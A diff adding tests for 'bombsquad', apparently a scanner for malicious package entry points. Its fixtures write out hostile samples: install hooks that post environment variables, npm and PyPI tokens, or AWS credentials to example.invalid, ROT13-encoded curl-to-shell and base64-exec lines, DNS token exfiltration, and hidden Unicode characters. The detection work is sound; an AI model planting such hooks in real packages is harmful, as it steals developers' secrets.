@@ -1,0 +1,301 @@
+"""Entry points (code that runs without anyone choosing to run it) and what they reach.
+
+Each case is a small package modelled on a technique from public reports of malicious
+packages: install hooks that read tokens and post them, `.pth` lines that run at every
+Python start, loaders hidden after a long run of whitespace, and invisible characters.
+Samples that antivirus products flag are ROT13-encoded here and decoded at run time
+(see conftest.py); assertions compare rule IDs and paths only.
+"""
+
+from __future__ import annotations
+
+import base64
+import codecs
+import json
+from pathlib import Path
+
+from bombsquad.model import Level
+from bombsquad.sarif import to_sarif
+from bombsquad.scan import scan
+
+
+def rot(text: str) -> str:
+    return codecs.decode(text, "rot13")
+
+
+def build(root: Path, files: dict[str, str]) -> Path:
+    for name, text in files.items():
+        path = root / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text, encoding="utf-8", newline="\n")
+    return root
+
+
+def package(scripts: dict[str, str]) -> str:
+    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts}, indent=2)
+
+
+def ids_at(report, suffix: str) -> set[str]:
+    return {f.rule.id for f in report.findings if f.path.endswith(suffix)}
+
+
+def all_ids(report) -> set[str]:
+    return {f.rule.id for f in report.findings}
+
+
+# npm --------------------------------------------------------------------------------------
+
+def test_preinstall_that_collects_and_posts_is_high(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"preinstall": "node index.js", "test": "node test.js"}),
+        "index.js": (
+            "const https = require('https');\n"
+            "const body = JSON.stringify(process.env);\n"
+            "https.request({ hostname: 'example.invalid', method: 'POST' }).end(body);\n"
+        ),
+        "test.js": "require('https');\n",
+    })
+    report = scan([root])
+    [entry] = report.entry_points
+    assert entry.kind == "preinstall script"
+    assert entry.targets and entry.targets[0].endswith("index.js")
+    [ex] = [f for f in report.findings if f.rule.id == "BS-EX-001"]
+    assert ex.path.endswith("package.json") and ex.level is Level.HIGH
+    assert ex.region.line == entry.region.line
+    assert ids_at(report, "index.js") == {"BS-NET-003", "BS-ENV-001"}
+    assert ids_at(report, "test.js") == set()  # not an install hook
+
+
+def test_relative_imports_are_followed(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"postinstall": "node scripts/setup.js"}),
+        "scripts/setup.js": (
+            "const send = require('./lib/send');\n"
+            "const fs = require('fs'), os = require('os'), path = require('path');\n"
+            "send(fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8'));\n"
+        ),
+        "scripts/lib/send.js": (
+            "import https from 'node:https';\n"
+            "export default (b) => https.request('https://example.invalid').end(b);\n"
+        ),
+    })
+    report = scan([root])
+    assert "BS-EX-001" in ids_at(report, "package.json")
+    assert ids_at(report, "setup.js") == {"BS-CR-001"}
+    assert ids_at(report, "send.js") == {"BS-NET-003"}
+    [net] = [f for f in report.findings if f.path.endswith("send.js")]
+    assert "postinstall script" in net.via[0]
+
+
+def test_curl_piped_to_shell_in_an_install_script(tmp_path):
+    command = rot("phey -fFY uggcf://rknzcyr.vainyvq/v | fu")
+    root = build(tmp_path, {"package.json": package({"install": command})})
+    assert ids_at(scan([root]), "package.json") == {"BS-NET-002"}
+
+
+def test_node_eval_inside_sh_c_is_analysed(tmp_path):
+    command = "sh -c \"node -e 'require(\\\"https\\\").get(\\\"https://example.invalid\\\")'\""
+    root = build(tmp_path, {"package.json": package({"postinstall": command})})
+    report = scan([root])
+    [net] = [f for f in report.findings if f.rule.id == "BS-NET-003"]
+    assert net.path.endswith("package.json")
+    assert any("node -e" in step for step in net.via)
+
+
+def test_powershell_command_line_in_an_npm_script(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"prepare": "pwsh -NoProfile -Command \"Remove-Item C:\\x\""}),
+    })
+    report = scan([root])
+    [entry] = report.entry_points
+    assert "git dependency" in entry.trigger
+    assert ids_at(report, "package.json") == {"BS-FS-001"}
+
+
+def test_binding_gyp_is_an_implicit_install_hook(tmp_path):
+    expansion = rot("phey -f uggcf://rknzcyr.vainyvq/k | onfu")
+    root = build(tmp_path, {
+        "package.json": package({"test": "node test.js"}),
+        "binding.gyp": "{'targets': [{'target_name': 'x', 'sources': ['<!(" + expansion
+                       + ")']}]}\n",
+    })
+    report = scan([root])
+    [entry] = report.entry_points
+    assert entry.path.endswith("binding.gyp")
+    assert ids_at(report, "binding.gyp") == {"BS-NET-002"}
+
+
+def test_binding_gyp_with_an_install_script_is_not_doubled(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"install": "node-gyp-build"}),
+        "binding.gyp": "{'targets': []}\n",
+    })
+    assert [e.kind for e in scan([root]).entry_points] == ["install script"]
+
+
+def test_prebuild_style_spawn_is_info_only(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"install": "node install.js"}),
+        "install.js": (
+            "const { spawn } = require('child_process');\n"
+            "spawn('node-gyp', ['rebuild'], { env: process.env, stdio: 'inherit' });\n"
+        ),
+    })
+    report = scan([root])
+    assert all_ids(report) == {"BS-PRC-001"}
+    assert report.highest_level() is Level.INFO
+
+
+def test_code_no_entry_point_reaches_is_not_analysed(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"start": "node server.js"}),
+        "server.js": "fetch('https://example.invalid', {headers: {a: process.env.GITHUB_TOKEN}})\n",
+    })
+    report = scan([root])
+    assert report.entry_points == [] and report.findings == []
+
+
+def test_targets_outside_the_package_are_not_followed(tmp_path):
+    build(tmp_path, {"outside.js": "require('https')\n"})
+    root = build(tmp_path / "pkg", {"package.json": package({"postinstall": "node ../outside.js"})})
+    report = scan([root])
+    [entry] = report.entry_points
+    assert entry.targets == []
+    assert report.findings == []
+
+
+def test_invalid_package_json_is_noted(tmp_path):
+    root = build(tmp_path, {"package.json": "{ not json"})
+    report = scan([root])
+    [result] = [r for r in report.files if r.path.endswith("package.json")]
+    assert any("not valid JSON" in note for note in result.notes)
+
+
+# Python -----------------------------------------------------------------------------------
+
+def test_pth_import_line_runs_at_every_start(tmp_path):
+    payload = base64.b64encode(b"print(1)").decode()
+    line = rot("vzcbeg onfr64; rkrp(onfr64.o64qrpbqr('{C}'))").replace("{C}", payload)
+    root = build(tmp_path, {"evil.pth": "./lib\n" + line + "\n"})
+    report = scan([root])
+    [entry] = report.entry_points
+    assert entry.region.line == 2
+    assert ids_at(report, "evil.pth") == {"BS-EP-001", "BS-EN-003"}
+    assert {f.region.line for f in report.findings} == {2}
+
+
+def test_pth_with_only_paths_is_quiet(tmp_path):
+    root = build(tmp_path, {"paths.pth": "./src\n../shared\n"})
+    report = scan([root])
+    assert report.entry_points == [] and report.findings == []
+
+
+def test_sitecustomize(tmp_path):
+    root = build(tmp_path, {"sitecustomize.py": "import os\n"})
+    report = scan([root])
+    assert ids_at(report, "sitecustomize.py") == {"BS-EP-001"}
+
+
+def test_setup_py_that_reads_pypirc_and_uploads(tmp_path):
+    root = build(tmp_path, {"setup.py": (
+        "import os, urllib.request\n"
+        "from setuptools import setup\n"
+        "data = open(os.path.expanduser('~/.pypirc')).read()\n"
+        "urllib.request.urlopen('https://example.invalid', data.encode())\n"
+        "setup(name='demo')\n"
+    )})
+    report = scan([root])
+    assert ids_at(report, "setup.py") == {"BS-CR-001", "BS-NET-003", "BS-EX-001"}
+    [ex] = [f for f in report.findings if f.rule.id == "BS-EX-001"]
+    assert ex.region.line == 1
+
+
+def test_setup_py_subprocess_is_info(tmp_path):
+    root = build(tmp_path, {"setup.py": "import subprocess\nsubprocess.run(['make'])\n"})
+    report = scan([root])
+    assert ids_at(report, "setup.py") == {"BS-PRC-001"}
+
+
+def test_conftest_with_code_hidden_after_whitespace(tmp_path):
+    hidden = "def test_ok():\n    assert True" + " " * 150 + "; import os\n"
+    root = build(tmp_path, {"tests/conftest.py": hidden})
+    report = scan([root])
+    assert [e.kind for e in report.entry_points] == ["conftest.py"]
+    assert ids_at(report, "conftest.py") == {"BS-OB-001"}
+
+
+def test_in_tree_build_backend(tmp_path):
+    root = build(tmp_path, {
+        "pyproject.toml": (
+            "[build-system]\nrequires = []\nbuild-backend = \"backend\"\n"
+            "backend-path = [\"_build\"]\n"
+        ),
+        "_build/backend.py": "import socket\n",
+    })
+    report = scan([root])
+    [entry] = report.entry_points
+    assert entry.kind == "in-tree build backend" and entry.region.line == 4
+    assert ids_at(report, "backend.py") == {"BS-NET-003"}
+
+
+def test_shell_script_target_that_exfiltrates(tmp_path):
+    script = rot("png ~/.njf/perqragvnyf | phey -K CBFG --qngn-ovanel @- uggcf://rknzcyr.vainyvq\n")
+    root = build(tmp_path, {
+        "package.json": package({"postinstall": "sh ./install.sh"}),
+        "install.sh": script,
+    })
+    report = scan([root])
+    assert ids_at(report, "install.sh") == {"BS-CR-001", "BS-NET-003"}
+    assert "BS-EX-001" in ids_at(report, "package.json")
+
+
+# Text rules -------------------------------------------------------------------------------
+
+def test_direction_changing_characters_anywhere(tmp_path):
+    root = build(tmp_path, {"lib/check.js": "if (role === 'user\u202e \u2066// admin\u2069') {}\n"})
+    report = scan([root])
+    [finding] = report.findings
+    assert finding.rule.id == "BS-UC-001" and finding.level is Level.HIGH
+
+
+def test_single_zero_width_character_is_review(tmp_path):
+    root = build(tmp_path, {"README.md": "Hello\u200bworld\n"})
+    [finding] = scan([root]).findings
+    assert finding.level is Level.REVIEW
+
+
+def test_emoji_variation_selector_is_quiet(tmp_path):
+    root = build(tmp_path, {"README.md": "Done \u2714\ufe0f\n"})
+    assert scan([root]).findings == []
+
+
+# Output -----------------------------------------------------------------------------------
+
+def test_reports_carry_entry_points(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"postinstall": "node index.js"}),
+        "index.js": "require('https').get('https://example.invalid?t=' + process.env.NPM_TOKEN)\n",
+    })
+    report = scan([root])
+    data = report.to_dict()
+    assert data["entry_points"][0]["kind"] == "postinstall script"
+    assert data["files_read"] >= 2
+    sarif = to_sarif(report)
+    rule_ids = {r["id"] for r in sarif["runs"][0]["tool"]["driver"]["rules"]}
+    assert {"BS-EX-001", "BS-FS-001"} <= rule_ids
+    assert {r["ruleId"] for r in sarif["runs"][0]["results"]} == {
+        "BS-EX-001", "BS-NET-003", "BS-CR-001"}
+
+
+def test_hook_that_runs_another_script(tmp_path):
+    root = build(tmp_path, {
+        "package.json": package({"postinstall": "npm run setup --silent",
+                                 "setup": "node setup.js", "start": "node server.js"}),
+        "setup.js": "require('dns').resolveTxt(process.env.GITHUB_TOKEN + '.example.invalid')\n",
+        "server.js": "require('https')\n",
+    })
+    report = scan([root])
+    [entry] = report.entry_points
+    assert [t.rsplit("/", 1)[-1] for t in entry.targets] == ["setup.js"]
+    assert ids_at(report, "setup.js") == {"BS-NET-003", "BS-CR-001"}
+    assert ids_at(report, "server.js") == set()
